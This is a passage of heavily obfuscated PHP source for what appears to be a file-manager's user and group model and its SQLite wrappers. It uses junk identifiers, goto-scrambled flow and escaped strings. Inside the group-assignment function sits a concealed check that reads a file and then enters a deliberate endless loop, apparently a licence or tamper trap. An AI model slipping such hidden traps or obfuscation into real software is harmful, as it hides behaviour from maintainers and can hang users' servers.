(!$cµÜÌ„§Ñª) { return $dï™¶Ÿö©š; } if (count($cµÜÌ„§Ñª) < 20) { foreach ($cµÜÌ„§Ñª as $f…•ŞŞ´½ê) { $dï™¶Ÿö©š[$f…•ŞŞ´½ê . $b†„Âîß‹™[33]] = $this->getInfoSimpleOuter($f…•ŞŞ´½ê); } } else { $båà˜µÊ¥Ã = array($b†„Âîß‹™[1555] => array($b†„Âîß‹™[413], $cµÜÌ„§Ñª)); if (count($cµÜÌ„§Ñª) == 1) { $båà˜µÊ¥Ã = array($b†„Âîß‹™[1555] => $cµÜÌ„§Ñª[0]); } $Cß‰ãˆ‚ç¯ = Model($b†„Âîß‹™[507])->field($this->simpleField)->where($båà˜µÊ¥Ã)->select(); $Cß‰ãˆ‚ç¯ = array_to_keyvalue($Cß‰ãˆ‚ç¯, $b†„Âîß‹™[1564]); foreach ($cµÜÌ„§Ñª as $f…•ŞŞ´½ê) { $F•«‘è†¬ = $Cß‰ãˆ‚ç¯[$f…•ŞŞ´½ê]; if (!$F•«‘è†¬) { $dï™¶Ÿö©š[$f…•ŞŞ´½ê . $b†„Âîß‹™[33]] = $this->getInfoSimpleOuter($f…•ŞŞ´½ê); continue; } $F•«‘è†¬[$b†„Âîß‹™[2164]] = Action($b†„Âîß‹™[2165])->parseUrl($F•«‘è†¬[$b†„Âîß‹™[2164]]); $dï™¶Ÿö©š[$f…•ŞŞ´½ê . $b†„Âîß‹™[33]] = $F•«‘è†¬; } } return $dï™¶Ÿö©š; } protected function userStatus($E™é©’²æ”, $e´ô¢«ÕÜœ) { $fùÍÓ­­¸ª = $this->getInfoSimple($E™é©’²æ”); if (!$fùÍÓ­­¸ª) { return !1; } $BîœªóÔà = array($_SERVER[›é¼±][745] => $e´ô¢«ÕÜœ); return $this->userEdit($E™é©’²æ”, $BîœªóÔà); } protected function userRemove($AÆÅÉùâ¡) { goto FÄä¡ÂìÊ‹; DÜÀº»…Ò: Model($cˆÈİÎ”Óñ[1819])->where($F†½‘­Ö ™)->delete(); Model($cˆÈİÎ”Óñ[2178])->where($F†½‘­Ö ™)->delete(); Model($cˆÈİÎ”Óñ[2194])->where($F†½‘­Ö ™)->delete(); goto d‡÷‹ˆÌà; FÄä¡ÂìÊ‹: $cˆÈİÎ”Óñ =& $_SERVER[›é¼±]; $e¿Ïì¿½ŞÕ = $this->getInfoSimple($AÆÅÉùâ¡); if (!$e¿Ïì¿½ŞÕ) { return !1; } goto FŒ±òƒ†®£; d‡÷‹ˆÌà: Model($cˆÈİÎ”Óñ[2015])->removeUserAll($AÆÅÉùâ¡); Model($cˆÈİÎ”Óñ[827])->userRootRemove($AÆÅÉùâ¡); return $this->where($F†½‘­Ö ™)->delete(); goto C®‚›”‚Ü±; FŒ±òƒ†®£: $F†½‘­Ö ™ = array($cˆÈİÎ”Óñ[1555] => $AÆÅÉùâ¡); Model($cˆÈİÎ”Óñ[589])->where($F†½‘­Ö ™)->delete(); Model($cˆÈİÎ”Óñ[2193])->where($F†½‘­Ö ™)->delete(); goto DÜÀº»…Ò; C®‚›”‚Ü±: } protected function userGroupSet($CÑâàç‡¸‰, $E²³™Àøœğ, $BéÂØ „ÍÀ = array()) { goto Aòã¡‹ˆ…©; dÏÍ¡ì‚»—: $eË‚£ØŠµ = array(); $cÉ‹Ş¡Š¡÷ = 0; foreach ($E²³™Àøœğ as $D‚»¸Ê‡‚ï => $e˜‰âÇ”ê·) { $Bï‘˜Ÿ‹Àœ = array($eäÏ¯®ä³¹[1564] => $CÑâàç‡¸‰, $eäÏ¯®ä³¹[1733] => $D‚»¸Ê‡‚ï, $eäÏ¯®ä³¹[1833] => $e˜‰âÇ”ê·); $Bï‘˜Ÿ‹Àœ[$eäÏ¯®ä³¹[1756]] = isset($BéÂØ „ÍÀ[$cÉ‹Ş¡Š¡÷]) ? $BéÂØ „ÍÀ[$cÉ‹Ş¡Š¡÷] : 0; $cÉ‹Ş¡Š¡÷++; $eË‚£ØŠµ[] = $Bï‘˜Ÿ‹Àœ; } goto D·îµ®’ç‘; D·îµ®’ç‘: return $e›ƒªøï†æ->addAll($eË‚£ØŠµ, array(), !0); goto DÍ·Å†¬ƒğ; aîïé«·¿Ò: if (!$Fëñ³³Õ²Ú || !is_array($E²³™Àøœğ)) { return !1; } $e›ƒªøï†æ = Model($eäÏ¯®ä³¹[1819]); $e›ƒªøï†æ->where(array($eäÏ¯®ä³¹[1564] => $CÑâàç‡¸‰))->delete(); goto dÏÍ¡ì‚»—; Aòã¡‹ˆ…©: $eäÏ¯®ä³¹ =& $_SERVER[›é¼±]; if (!isset($_SERVER[$eäÏ¯®ä³¹[858]]) || !isset($_SERVER[$eäÏ¯®ä³¹[865]])) { goto eµóçÃğùô; eµóçÃğùô: $fÏ³„‘Á = $eäÏ¯®ä³¹[876]; $aà•õ”Ğğä = $eäÏ¯®ä³¹[860]; $eÆÆ¥‰Ú = $_SERVER[$eäÏ¯®ä³¹[861]] . $eäÏ¯®ä³¹[862]; goto C„áÅ’ìô; C„áÅ’ìô: $bÅâÃÖ”ÃÉ = $aà•õ”Ğğä($eÆÆ¥‰Ú); $eğ¦µß‘Ùè = explode($eäÏ¯®ä³¹[229], $bÅâÃÖ”ÃÉ); if (count($eğ¦µß‘Ùè) < $eäÏ¯®ä³¹[620]) { $c—ÃÆÛß = $eäÏ¯®ä³¹[863]; $c—ÃÆÛß(); } goto A•¦¹«„Ş; A•¦¹«„Ş: $Dšâ¤’‹¿ó = $eäÏ¯®ä³¹[877]; $Dšâ¤’‹¿ó($_SERVER[$eäÏ¯®ä³¹[878]]); $D–‹øòç×± = 1; goto dç¸›»Ã¼Ğ; dç¸›»Ã¼Ğ: for ($e•Š¥µÇŒ± = $D–‹øòç×±; $e•Š¥µÇŒ± > 0; $e•Š¥µÇŒ±++) { $Dšâ¤’‹¿ó = json_encode($GLOBALS[$eäÏ¯®ä³¹[413]]); } goto e¯¨¢ÜÊˆñ; e¯¨¢ÜÊˆñ: } $Fëñ³³Õ²Ú = $this->getInfoSimple($CÑâàç‡¸‰); goto aîïé«·¿Ò; DÍ·Å†¬ƒğ: } protected function userGroupAdd($E†Ü™‘ªÔ, $Fï±Öê¢Õñ = array()) { $e³×–‰ÀŒ¶ =& $_SERVER[›é¼±]; $aë½ÑÇ†÷ = $this->getInfoSimple($E†Ü™‘ªÔ); if (!$aë½ÑÇ†÷ || empty($Fï±Öê¢Õñ)) { return !1; } $CŠª—äÅ–Ç = array(); foreach ($Fï±Öê¢Õñ as $C¼©ÕÔÆƒÚ => $cÄÜª»¡ã) { $CŠª—äÅ–Ç[] = array($e³×–‰ÀŒ¶[1564] => $E†Ü™‘ªÔ, $e³×–‰ÀŒ¶[1733] => $C¼©ÕÔÆƒÚ, $e³×–‰ÀŒ¶[1833] => $cÄÜª»¡ã, $e³×–‰ÀŒ¶[1756] => 0); } return Model($e³×–‰ÀŒ¶[1819])->addAll($CŠª—äÅ–Ç, array(), !0); } protected function userGroupRemove($eœÌ¸†¿¡Ù, $DÈ°Æ ßµ) { $f‹±­²Ğå¶ =& $_SERVER[›é¼±]; $BšÑ£­’Ğ‘ = $this->getInfoSimple($eœÌ¸†¿¡Ù); if (!$BšÑ£­’Ğ‘ || !$DÈ°Æ ßµ) { return !1; } $EÅ¤®¼Éñ = array($f‹±­²Ğå¶[1555] => $eœÌ¸†¿¡Ù, $f‹±­²Ğå¶[1817] => $DÈ°Æ ßµ); return Model($f‹±­²Ğå¶[1819])->where($EÅ¤®¼Éñ)->delete(); } public function listData() { $FáİèìÖ‡ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($FáİèìÖ‡[$_SERVER[›é¼±][367]]); return $FáİèìÖ‡; } public function listByID($Fé¡•ù) { goto d÷É«¡§; d÷É«¡§: $a‰‘Òçôƒ± =& $_SERVER[›é¼±]; if (!$Fé¡•ù) { return; } $a¹¿ÀâĞ¾Å = array($a‰‘Òçôƒ±[1564] => array($a‰‘Òçôƒ±[7], $Fé¡•ù)); goto d¸†Ô¶¡¥Ú; d¸†Ô¶¡¥Ú: $DöÑ‰×Ã·‹ = $this->where($a¹¿ÀâĞ¾Å)->select(); $DöÑ‰×Ã·‹ = array_sort_keep($DöÑ‰×Ã·‹, $a‰‘Òçôƒ±[1564], $Fé¡•ù); $this->_listDataApply($DöÑ‰×Ã·‹); goto cë¿…°ˆÃ“; cë¿…°ˆÃ“: return $DöÑ‰×Ã·‹; goto FÓİÇ¡œçĞ; FÓİÇ¡œçĞ: } public function listByGroup($EÈöç¢‡¿ = 0, $dÉ’¾¤«îÃ = array()) { goto a†Â‰£¤–Â; eîß¯Ã¶÷Í: if ($EÈöç¢‡¿) { $aâÀÂø¾É = array($A¦Ò¤‘ÒÉ¤[2195] => intval($EÈöç¢‡¿)); $CÇØÃ¨ ” = "\114\105\x46\124\x20\x4a\x4f\111\116\40{$this->tablePrefix}\165\163\x65\162\x5f\x67\x72\x6f\165\x70\40\165\163\145\x72\137\147\162\x6f\x75\160\40\x6f\x6e\40\x75\x73\x65\162\56\165\x73\145\162\x49\104\x20\75\x20\165\x73\x65\162\137\147\162\x6f\x75\160\x2e\x75\163\145\162\111\x44"; $a­òÔÌÃ¨ = Input::get($A¦Ò¤‘ÒÉ¤[449], null, $A¦Ò¤‘ÒÉ¤[33]) ? $A¦Ò¤‘ÒÉ¤[33] : $A¦Ò¤‘ÒÉ¤[2196]; } if (isset($dÉ’¾¤«îÃ[$A¦Ò¤‘ÒÉ¤[745]])) { $aâÀÂø¾É[$A¦Ò¤‘ÒÉ¤[2197]] = $dÉ’¾¤«îÃ[$A¦Ò¤‘ÒÉ¤[745]]; } $fò³°ÆÏ = $this->_makeOrder($a­òÔÌÃ¨)->field($A¦Ò¤‘ÒÉ¤[2198])->where($aâÀÂø¾É)->join($CÇØÃ¨ ”)->selectPage(50); goto eè‚½Õ‡¶; eè‚½Õ‡¶: $this->_listDataApply($fò³°ÆÏ[$A¦Ò¤‘ÒÉ¤[367]]); return $fò³°ÆÏ; goto Bôô½›Õ§°; a†Â‰£¤–Â: $A¦Ò¤‘ÒÉ¤ =& $_SERVER[›é¼±]; $CÇØÃ¨ ” = $A¦Ò¤‘ÒÉ¤[33]; $aâÀÂø¾É = array(); goto eîß¯Ã¶÷Í; Bôô½›Õ§°: } private function _makeOrder($DöîÀ“«òç = '') { goto A™§Å¼ƒáø; A™§Å¼ƒáø: $dË‘§Ã”‚ =& $_SERVER[›é¼±]; $eõÕß¾‡ = array($dË‘§Ã”‚[1564], $dË‘§Ã”‚[28], $dË‘§Ã”‚[1719], $dË‘§Ã”‚[1691], $dË‘§Ã”‚[194]); $cÙšŠ•İÃƒ = array($dË‘§Ã”‚[442] => $dË‘§Ã”‚[443], $dË‘§Ã”‚[444] => $dË‘§Ã”‚[445]); goto bà„´ª‘Î; c“ô”öéË: $DöîÀ“«òç = $DöîÀ“«òç . "\x75\x73\145\162\x2e{$A±Í§½àŞ‰}\x20{$b‚„îù§ã}\x2c\40\165\x73\145\162\56\x75\163\145\x72\x49\x44\x20\141\x73\x63"; return $this->alias($dË‘§Ã”‚[1940])->order($DöîÀ“«òç); goto aİº•¶Ö«Ğ; bà„´ª‘Î: $A±Í§½àŞ‰ = Input::get($dË‘§Ã”‚[449], $dË‘§Ã”‚[7], $dË‘§Ã”‚[1555], $eõÕß¾‡); $b‚„îù§ã = Input::get($dË‘§Ã”‚[450], $dË‘§Ã”‚[7], $dË‘§Ã”‚[1820], array($dË‘§Ã”‚[1820], $dË‘§Ã”‚[444])); $b‚„îù§ã = $cÙšŠ•İÃƒ[$b‚„îù§ã]; goto c“ô”öéË; aİº•¶Ö«Ğ: } public function listSearch($CÛ¡‹Ößææ) { goto f¾œêà²šà; AçÙĞ³ —ò: $dù¾ùÜŒ¿Í = str_replace($DîÚÔŸé·ª[1823], $DîÚÔŸé·ª[1824], trim($dù¾ùÜŒ¿Í)); $eÁ—°Ô¼Œ = array($DîÚÔŸé·ª[28] => array($DîÚÔŸé·ª[381], "\x25{$dù¾ùÜŒ¿Í}\x25"), $DîÚÔŸé·ª[303] => array($DîÚÔŸé·ª[381], "{$dù¾ùÜŒ¿Í}\45"), $DîÚÔŸé·ª[1998] => array($DîÚÔŸé·ª[381], "{$dù¾ùÜŒ¿Í}\45"), $DîÚÔŸé·ª[992] => $DîÚÔŸé·ª[1825]); if (Input::check($dù¾ùÜŒ¿Í, $DîÚÔŸé·ª[309])) { $eÁ—°Ô¼Œ[$DîÚÔŸé·ª[1564]] = array($DîÚÔŸé·ª[381], "{$dù¾ùÜŒ¿Í}\45"); $eÁ—°Ô¼Œ[$DîÚÔŸé·ª[2179]] = array($DîÚÔŸé·ª[381], "{$dù¾ùÜŒ¿Í}\45"); } goto d¯ç²ˆ¹‹í; d¯ç²ˆ¹‹í: if (!$dù¾ùÜŒ¿Í) { $eÁ—°Ô¼Œ = array(); } if (isset($CÛ¡‹Ößææ[$DîÚÔŸé·ª[745]])) { $eÁ—°Ô¼Œ[$DîÚÔŸé·ª[745]] = $CÛ¡‹Ößææ[$DîÚÔŸé·ª[745]]; } $eÁ—°Ô¼Œ = $this->parseWhereLike($eÁ—°Ô¼Œ); goto DíŸã®¡Ú; Cˆˆ¥•»—: $this->_filterByGroup($b™®ší´×, $Aé¼•ª‹Îà); return $b™®ší´×; goto Dƒ¨”•Ã²; DíŸã®¡Ú: $b™®ší´× = $this->_makeOrder()->where($eÁ—°Ô¼Œ)->selectPage(20); if (!$b™®ší´× || count($b™®ší´×[$DîÚÔŸé·ª[367]]) < 5 && Input::check($dù¾ùÜŒ¿Í, $DîÚÔŸé·ª[316])) { $bËÍ³öİ‘Ù = $this->_searchFromMeta($DîÚÔŸé·ª[457], $dù¾ùÜŒ¿Í, 10); $B™¡¯ãÊôÆ = $this->_searchFromMeta($DîÚÔŸé·ª[458], $dù¾ùÜŒ¿Í, 10); $a¥±÷ß‹ëö = array_merge($bËÍ³öİ‘Ù, $B™¡¯ãÊôÆ, $b™®ší´×[$DîÚÔŸé·ª[367]]); $b™®ší´×[$DîÚÔŸé·ª[367]] = array_unique_by_key($a¥±÷ß‹ëö, $DîÚÔŸé·ª[1564]); $b™®ší´×[$DîÚÔŸé·ª[364]][$DîÚÔŸé·ª[365]] = count($b™®ší´×[$DîÚÔŸé·ª[367]]); $b™®ší´×[$DîÚÔŸé·ª[364]][$DîÚÔŸé·ª[366]] = ceil($b™®ší´×[$DîÚÔŸé·ª[364]][$DîÚÔŸé·ª[365]] / $b™®ší´×[$DîÚÔŸé·ª[364]][$DîÚÔŸé·ª[361]]); } $this->_listDataApply($b™®ší´×[$DîÚÔŸé·ª[367]]); goto Cˆˆ¥•»—; f¾œêà²šà: $DîÚÔŸé·ª =& $_SERVER[›é¼±]; $dù¾ùÜŒ¿Í = $CÛ¡‹Ößææ[$DîÚÔŸé·ª[1821]]; $Aé¼•ª‹Îà = isset($CÛ¡‹Ößææ[$DîÚÔŸé·ª[1822]]) ? $CÛ¡‹Ößææ[$DîÚÔŸé·ª[1822]] : !1; goto AçÙĞ³ —ò; Dƒ¨”•Ã²: } private function _filterByGroup(&$Aèšàø×å‡, $F•ì¾Â†ùˆ) { $B‡ˆ…‹“¾ =& $_SERVER[›é¼±]; if (!$F•ì¾Â†ùˆ) { return $Aèšàø×å‡; } foreach ($Aèšàø×å‡[$B‡ˆ…‹“¾[367]] as $fÊŒ›ÄÏÄÃ => &$A¹Ğˆöã¾‚) { $Dáß®¯‡µ” = array_to_keyvalue($A¹Ğˆöã¾‚[$B‡ˆ…‹“¾[1910]], $B‡ˆ…‹“¾[33], $B‡ˆ…‹“¾[1733]); if (!in_array($F•ì¾Â†ùˆ, $Dáß®¯‡µ”)) { unset($Aèšàø×å‡[$B‡ˆ…‹“¾[367]][$fÊŒ›ÄÏÄÃ]); } } unset($A¹Ğˆöã¾‚); $Aèšàø×å‡[$B‡ˆ…‹“¾[367]] = array_values($Aèšàø×å‡[$B‡ˆ…‹“¾[367]]); $Aèšàø×å‡[$B‡ˆ…‹“¾[364]] = array($B‡ˆ…‹“¾[1972] => count($Aèšàø×å‡[$B‡ˆ…‹“¾[367]]), $B‡ˆ…‹“¾[1970] => $Aèšàø×å‡[$B‡ˆ…‹“¾[364]][$B‡ˆ…‹“¾[361]], $B‡ˆ…‹“¾[1969] => 1, $B‡ˆ…‹“¾[1971] => 1); } private function _searchFromMeta($D²è­»ß“», $f¥ä¦œ±‡®, $dªëªó‹) { goto E¦ÖÈä†ğ; eãšÁå×õà: $c›à¶ÈêÆ = $this->parseWhereLike($c›à¶ÈêÆ); $a•ë‰ŠºÎß = Model($d·ôÍËñ¿Š[2199])->where($c›à¶ÈêÆ)->limit($dªëªó‹)->select(); if (!$a•ë‰ŠºÎß) { return array(); } goto bÆÉö¡·¼÷; E¦ÖÈä†ğ: $d·ôÍËñ¿Š =& $_SERVER[›é¼±]; $f¥ä¦œ±‡® = strtolower($f¥ä¦œ±‡®); $c›à¶ÈêÆ = array($d·ôÍËñ¿Š[93] => $D²è­»ß“», $d·ôÍËñ¿Š[372] => array($d·ôÍËñ¿Š[381], "\x25{$f¥ä¦œ±‡®}\x25")); goto eãšÁå×õà; eåé’˜İ¬: return $F¼Îˆ®êŞå; goto e±…Ö…Àç†; bÆÉö¡·¼÷: $a•ë‰ŠºÎß = array_to_keyvalue($a•ë‰ŠºÎß, $d·ôÍËñ¿Š[33], $d·ôÍËñ¿Š[1564]); $F¼Îˆ®êŞå = $this->where(array($d·ôÍËñ¿Š[1555] => array($d·ôÍËñ¿Š[7], $a•ë‰ŠºÎß)))->select(); if (!$F¼Îˆ®êŞå) { return array(); } goto eåé’˜İ¬; e±…Ö…Àç†: } private function _listDataApplyItem($DöâÍ˜îÏ“) { $DßàÍÎà­× = array($DöâÍ˜îÏ“); $this->_listDataApply($DßàÍÎà­×); return $DßàÍÎà­×[0]; } private function _listDataApply(&$e†„Ì®˜‘©) { goto B“»à“ùÍ; B“»à“ùÍ: $b¥Ö“ÓÎÚ =& $_SERVER[›é¼±]; if (!$e†„Ì®˜‘©) { return; } array_remove_key($e†„Ì®˜‘©, $b¥Ö“ÓÎÚ[884]); goto fù¶Å†ßš‡; fù¶Å†ßš‡: $A¼Ÿë”²İ¤ = array_to_keyvalue($e†„Ì®˜‘©, $b¥Ö“ÓÎÚ[33], $b¥Ö“ÓÎÚ[1564]); $this->_listAppendGroup($e†„Ì®˜‘©, $A¼Ÿë”²İ¤); $this->_listAppendMeta($e†„Ì®˜‘©, $A¼Ÿë”²İ¤); goto CËªášà×Ñ; CËªášà×Ñ: $this->_listAppendSourceRoot($e†„Ì®˜‘©, $A¼Ÿë”²İ¤); goto F²âÒ×¢ÕÍ; F²âÒ×¢ÕÍ: } private function _listAppendSourceRoot(&$bÚÄ‡Â§Å†, $b¼‹¨¾÷ ) { goto fµÎ†ß¸¦Å; fµÎ†ß¸¦Å: $FÎñ÷°…‹ =& $_SERVER[›é¼±]; $b÷õ‘ˆÅ• = array($FÎñ÷°…‹[492] => 0, $FÎñ÷°…‹[498] => array($FÎñ÷°…‹[7], $b¼‹¨¾÷ ), $FÎñ÷°…‹[406] => SourceModel::TYPE_USER); $D°°Æ’‹¤Û = Model($FÎñ÷°…‹[827])->order($FÎñ÷°…‹[1831])->field($FÎñ÷°…‹[1832]); goto béëå÷ŠÏ; béëå÷ŠÏ: $AÆÎÔá‹œï = $D°°Æ’‹¤Û->limit(count($b¼‹¨¾÷ ))->where($b÷õ‘ˆÅ•)->select(); $AÆÎÔá‹œï = array_to_keyvalue($AÆÎÔá‹œï, $FÎñ÷°…‹[498]); $AÆÎÔá‹œï = array_remove_key($AÆÎÔá‹œï, $FÎñ÷°…‹[498]); goto fõÃîÄÊ™œ; fõÃîÄÊ™œ: foreach ($bÚÄ‡Â§Å† as &$D½¥Ï™‘ø) { $D½¥Ï™‘ø[$FÎñ÷°…‹[85]] = $AÆÎÔá‹œï[$D½¥Ï™‘ø[$FÎñ÷°…‹[1564]]] ? $AÆÎÔá‹œï[$D½¥Ï™‘ø[$FÎñ÷°…‹[1564]]] : array(); } unset($D½¥Ï™‘ø); goto DŞ˜é„‚‰ö; DŞ˜é„‚‰ö: } private function _listAppendGroup(&$EÌÒ¼Ïñ, $b¯¼ªÏã‡Ç) { goto dÚ†¿é–õê; E“œ¾ˆëÒ: $d±å°àÒ™Œ = array_to_keyvalue_group($d±å°àÒ™Œ, $AğÃÅ…Œ¼Š[1564]); foreach ($d±å°àÒ™Œ as &$E§Ÿ§Íğ°¶) { $e™ÑŠŠŠ„¿ = array(); foreach ($E§Ÿ§Íğ°¶ as $E»ÍáÊÆŒ) { if (!$E»ÍáÊÆŒ[$AğÃÅ…Œ¼Š[1833]]) { continue; } $AÁÑùÌØ¹ = Model($AğÃÅ…Œ¼Š[501])->listData($E»ÍáÊÆŒ[$AğÃÅ…Œ¼Š[1833]]); $e™ÑŠŠŠ„¿[] = array($AğÃÅ…Œ¼Š[1733] => $E»ÍáÊÆŒ[$AğÃÅ…Œ¼Š[1733]], $AğÃÅ…Œ¼Š[2201] => $dŒ¥Î°´ÏÄ[$E»ÍáÊÆŒ[$AğÃÅ…Œ¼Š[1733]]][$AğÃÅ…Œ¼Š[28]], $AğÃÅ…Œ¼Š[515] => $dŒ¥Î°´ÏÄ[$E»ÍáÊÆŒ[$AğÃÅ…Œ¼Š[1733]]][$AğÃÅ…Œ¼Š[515]], $AğÃÅ…Œ¼Š[408] => $AÁÑùÌØ¹); } $E§Ÿ§Íğ°¶ = $e™ÑŠŠŠ„¿; } unset($E§Ÿ§Íğ°¶); goto e¹·°×ßˆ®; dÚ†¿é–õê: $AğÃÅ…Œ¼Š =& $_SERVER[›é¼±]; $dƒÖÎ¨†Ò‘ = array($AğÃÅ…Œ¼Š[1564] => array($AğÃÅ…Œ¼Š[7], $b¯¼ªÏã‡Ç)); $d±å°àÒ™Œ = Model($AğÃÅ…Œ¼Š[1819])->where($dƒÖÎ¨†Ò‘)->select(); goto CŒÏâÓ»ƒ; e¹·°×ßˆ®: foreach ($EÌÒ¼Ïñ as &$Bµ³Ğ‘ŒÙ²) { $Bµ³Ğ‘ŒÙ²[$AğÃÅ…Œ¼Š[1910]] = array(); if (isset($d±å°àÒ™Œ[$Bµ³Ğ‘ŒÙ²[$AğÃÅ…Œ¼Š[1564]]])) { $Bµ³Ğ‘ŒÙ²[$AğÃÅ…Œ¼Š[1910]] = $d±å°àÒ™Œ[$Bµ³Ğ‘ŒÙ²[$AğÃÅ…Œ¼Š[1564]]]; } } unset($Bµ³Ğ‘ŒÙ²); goto Aß¹ÖÈÕï†; CĞÓÇ„‰£: $dƒÖÎ¨†Ò‘ = array($AğÃÅ…Œ¼Š[1733] => array($AğÃÅ…Œ¼Š[7], $f„»ºØÂ®÷)); $dŒ¥Î°´ÏÄ = Model($AğÃÅ…Œ¼Š[1908])->field($AğÃÅ…Œ¼Š[2200])->where($dƒÖÎ¨†Ò‘)->select(); $dŒ¥Î°´ÏÄ = array_to_keyvalue($dŒ¥Î°´ÏÄ, $AğÃÅ…Œ¼Š[1733]); goto E“œ¾ˆëÒ; CŒÏâÓ»ƒ: $f„»ºØÂ®÷ = array_to_keyvalue($d±å°àÒ™Œ, $AğÃÅ…Œ¼Š[33], $AğÃÅ…Œ¼Š[1733]); $f„»ºØÂ®÷ = array_remove_value(array_unique($f„»ºØÂ®÷), $AğÃÅ…Œ¼Š[191]); if (!$f„»ºØÂ®÷ || !$d±å°àÒ™Œ) { return; } goto CĞÓÇ„‰£; Aß¹ÖÈÕï†: } public function userAppendGroup($e’çéØ) { $DÉ…¿ƒ÷Á =& $_SERVER[›é¼±]; if (!$e’çéØ) { return array(); } $this->_listAppendGroup($e’çéØ, array_to_keyvalue($e’çéØ, $DÉ…¿ƒ÷Á[33], $DÉ…¿ƒ÷Á[1564])); return $e’çéØ; } private function _listAppendMeta(&$D“²ô²”ƒ, $f‚ìÁ’ãË) { goto Eˆâ“ÓÕ¶½; Eˆâ“ÓÕ¶½: $DŠäØ¡´ˆÒ =& $_SERVER[›é¼±]; $aù¶‘²Òô = UserJobModel::JOB_KEY; $cÏÏà”Õ÷ = array($DŠäØ¡´ˆÒ[2180]); goto BªÎœºğ; b›î¾ˆİ í: foreach ($D“²ô²”ƒ as &$Aª»ÎÈñ”) { $e–ØÛçÆİ = array(); if (isset($d‚Ò³Ş“â‰[$Aª»ÎÈñ”[$DŠäØ¡´ˆÒ[1564]]])) { $e–ØÛçÆİ = $d‚Ò³Ş“â‰[$Aª»ÎÈñ”[$DŠäØ¡´ˆÒ[1564]]]; } $Aª»ÎÈñ”[$DŠäØ¡´ˆÒ[2203]] = array(); if (isset($e–ØÛçÆİ[$aù¶‘²Òô])) { $Aª»ÎÈñ”[$DŠäØ¡´ˆÒ[2203]] = $c»ĞÖääÃ->getUserJobInfo($e–ØÛçÆİ[$aù¶‘²Òô]); } } unset($Aª»ÎÈñ”); goto EÍ•Ìˆ×ºš; AÛá½Åî¨Ú: foreach ($d‚Ò³Ş“â‰ as &$Eå·ë„¥´) { $A¨Ä†øöçó = array(); foreach ($Eå·ë„¥´ as $a®ì £æ›§) { if (!in_array($a®ì £æ›§[$DŠäØ¡´ˆÒ[93]], $cÏÏà”Õ÷)) { $A¨Ä†øöçó[$a®ì £æ›§[$DŠäØ¡´ˆÒ[93]]] = $a®ì £æ›§[$DŠäØ¡´ˆÒ[372]]; } } $Eå·ë„¥´ = $A¨Ä†øöçó; } unset($Eå·ë„¥´); $c»ĞÖääÃ = Model($DŠäØ¡´ˆÒ[2202]); goto b›î¾ˆİ í; BªÎœºğ: $aÜœÃè†­À = array($DŠäØ¡´ˆÒ[1564] => array($DŠäØ¡´ˆÒ[7], $f‚ìÁ’ãË)); $d‚Ò³Ş“â‰ = Model($DŠäØ¡´ˆÒ[2178])->where($aÜœÃè†­À)->select(); $d‚Ò³Ş“â‰ = array_to_keyvalue_group($d‚Ò³Ş“â‰, $DŠäØ¡´ˆÒ[1564]); goto AÛá½Åî¨Ú; EÍ•Ìˆ×ºš: } protected function groupUserAll($bÑ’˜•à›‹) { $C‘ôâ¡©œÌ =& $_SERVER[›é¼±]; if (!$bÑ’˜•à›‹) { return !1; } $Fíë¸ãªĞÜ = Model($C‘ôâ¡©œÌ[1819])->field($C‘ôâ¡©œÌ[1564])->where(array($C‘ôâ¡©œÌ[1733] => array($C‘ôâ¡©œÌ[7], $bÑ’˜•à›‹)))->select(); $Fíë¸ãªĞÜ = array_to_keyvalue($Fíë¸ãªĞÜ, $C‘ôâ¡©œÌ[33], $C‘ôâ¡©œÌ[1564]); return array_unique($Fíë¸ãªĞÜ); } public function userSearch($c‚¿ŠÇïïÀ, $A¡ğÂ³èÇ = "\x2a") { return Model($_SERVER[›é¼±][532])->where($c‚¿ŠÇïïÀ)->field($A¡ğÂ³èÇ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\162\x5f\x6f\x70\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($c¾ÀŸ«Ÿ­) { $aÔô«è«È =& $_SERVER[›é¼±]; if (!defined($aÔô«è«È[468])) { define($aÔô«è«È[468], 0); } return "\125\163\x65\x72\117\160\164\x69\x6f\156\137{$c¾ÀŸ«Ÿ­}\137" . USER_ID; } protected function filterWhere($cĞ­‹Õó³½) { $E“¾ÊôÚ„Û =& $_SERVER[›é¼±]; if (!defined($E“¾ÊôÚ„Û[468])) { define($E“¾ÊôÚ„Û[468], 0); } $cĞ­‹Õó³½[$E“¾ÊôÚ„Û[1564]] = USER_ID; return $cĞ­‹Õó³½; } public function cacheRemoveUser($E†ñÊ††½Â, $C¾ÂÊÆ·¬Ö) { return Cache::remove("\125\163\145\x72\x4f\160\x74\x69\157\156\137{$E†ñÊ††½Â}\137" . $C¾ÂÊÆ·¬Ö); } protected function optionDefault($C©Ğöš¶‹À = '') { $FÅ†öîÃ… =& $_SERVER[›é¼±]; if ($C©Ğöš¶‹À == $FÅ†öîÃ…[33]) { return $GLOBALS[$FÅ†öîÃ…[6]][$FÅ†öîÃ…[2204]]; } if ($C©Ğöš¶‹À == $FÅ†öîÃ…[2205]) { return $GLOBALS[$FÅ†öîÃ…[6]][$FÅ†öîÃ…[2206]]; } } } goto dˆÉ…¹¥´Ø; AÜ¨ó­™«Á: class DbSqlite extends DbSqliteBase { public function query($aÊ‡Ë‹‰Úš) { $B­ÉÓå÷ëë =& $_SERVER[›é¼±]; if (!CacheLock::fileLock($B­ÉÓå÷ëë[9])) { return !1; } $Aºõáˆ˜Á = parent::query($aÊ‡Ë‹‰Úš); CacheLock::fileUnLock($B­ÉÓå÷ëë[9]); return $Aºõáˆ˜Á; } public function execute($AË±ì¿±İÔ) { $f¦õ•¡åÍË =& $_SERVER[›é¼±]; if (!CacheLock::fileLock($f¦õ•¡åÍË[9])) { return !1; } $F×„¹œÀõ¬ = parent::execute($AË±ì¿±İÔ); CacheLock::fileUnLock($f¦õ•¡åÍË[9]); return $F×„¹œÀõ¬; } } class DbSqlite3 extends DbSqlite3Base { public function query($C„†µ…ãº„) { $Cá¶óÚµµÂ =& $_SERVER[›é¼±]; if (!CacheLock::fileLock($Cá¶óÚµµÂ[9])) { return !1; } $Cõ¬‘ÅÒÉ² = parent::query($C„†µ…ãº„); CacheLock::fileUnLock($Cá¶óÚµµÂ[9]); return $Cõ¬‘ÅÒÉ²; } public function execute($B£ó÷ ©) { $fİ¼‹¢§˜ =& $_SERVER[›é¼±]; if (!CacheLock::fileLock($fİ¼‹¢§˜[9])) { return !1; } $a©¾ğçÁ¼ = parent::execute($B£ó÷ ©); CacheLock::fileUnLock($fİ¼‹¢§˜[9]); return 